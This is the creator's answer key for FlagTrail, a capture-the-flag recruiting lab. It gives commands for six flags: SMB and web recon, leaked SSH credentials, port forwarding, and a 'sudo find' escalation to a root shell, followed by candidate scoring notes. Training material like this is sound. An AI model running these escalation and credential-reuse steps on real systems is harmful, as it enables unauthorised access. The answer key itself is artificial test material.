# FlagTrail — Answer Key (creator only / SPOILERS)

Target IP below shown as `$T`. Candidate works from a box on the same host-only net.

## 0. Recon / SMB brief
```bash
smbclient -L //$T/ -N                 # list shares -> "public"
smbclient //$T/public -N -c 'ls'      # 1oy6dars.zip, briefing.zip
smbclient //$T/public -N -c 'get 1oy6dars.zip'
smbclient //$T/public -N -c 'get briefing.zip'
unzip briefing.zip                    # scenario + scope
nmap -sV -p- $T                       # 22 ssh, 80 http, 139/445 smb
```

## Flag 1 — robots.txt  (web recon)
```bash
curl http://$T/robots.txt
```
`FLAG{robots_txt_is_not_a_secret}` — robots also points at `/api/` and `/config`.

## Flag 2 — page source  (Ctrl+U)
```bash
curl -s http://$T/ | grep FLAG
```
`FLAG{view_source_reveals_more}` — in an HTML `<!-- comment -->` at the top of `/`.

## Flag 3 — exposed API  (+ credential leak)
```bash
curl http://$T/api/            # index lists endpoints
curl http://$T/api/flag        # FLAG{api_endpoints_left_exposed}
curl http://$T/api/config      # leaks ssh_username / ssh_password
# (also at http://$T/config )
```
`config` reveals: `hasker` / `DoppiPomidor!27`.

## Flag 4 — SSH foothold
```bash
ssh hasker@$T            # password: DoppiPomidor!27
cat ~/flag4.txt          # FLAG{ssh_foothold_established}
```

## Flag 5 — port forwarding to localhost
On the box, an admin page is bound to `127.0.0.1:8000` only. From the attacker box:
```bash
ssh -L 8000:127.0.0.1:8000 hasker@$T    # keep open
# in another terminal on the attacker box:
curl http://127.0.0.1:8000/             # FLAG{port_forwarding_unlocks_localhost}
```
(Or `curl 127.0.0.1:8000` directly in the SSH session.)

## Flag 6 — privesc via sudo find
```bash
sudo -l                                 # (ALL) NOPASSWD: /usr/bin/find
sudo find . -exec /bin/sh \; -quit      # -> root shell (GTFOBins)
cat /root/root.txt                       # FLAG{sudo_find_is_a_classic_gtfobin}
```

---

## Suggested scoring for recruiting
- **Flags 1–3** (web recon, API, cred discovery): baseline. Any serious candidate.
- **Flag 4**: can they operationalize found creds.
- **Flag 5**: understands SSH tunneling / pivoting — a real signal.
- **Flag 6**: knows GTFOBins / sudo abuse and *enumerates* (`sudo -l`) instead of guessing.

Watch *how* they work, not just the count: do they read `robots.txt` and source,
enumerate before brute-forcing, and document their path? The SMB brief explicitly
asks them to show their reasoning.
